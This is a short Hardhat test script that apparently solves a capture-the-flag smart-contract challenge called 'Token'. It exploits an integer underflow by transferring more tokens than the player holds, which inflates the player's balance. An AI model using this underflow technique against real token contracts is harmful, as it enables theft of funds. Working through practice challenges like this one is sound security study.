const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx, receiver

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]
    receiver = accounts[1]
    const challengeFactory = await ethers.getContractFactory(`Token`)
    challengeAddress = process.env.CHALLENGEADDRESS5 //address of my instance contract
    challenge = await challengeFactory.attach(challengeAddress)
})

it("Solves the challenge 'Token'", async () => {
    // give receiver more token that we have
    tx = await challenge.transfer(receiver.address, 21)
    await tx.wait(1)

    let balance = await challenge.balanceOf(player.address)
    assert(parseInt(balance.toString(), 10) > 20, "You don't have enough tokens!")
})
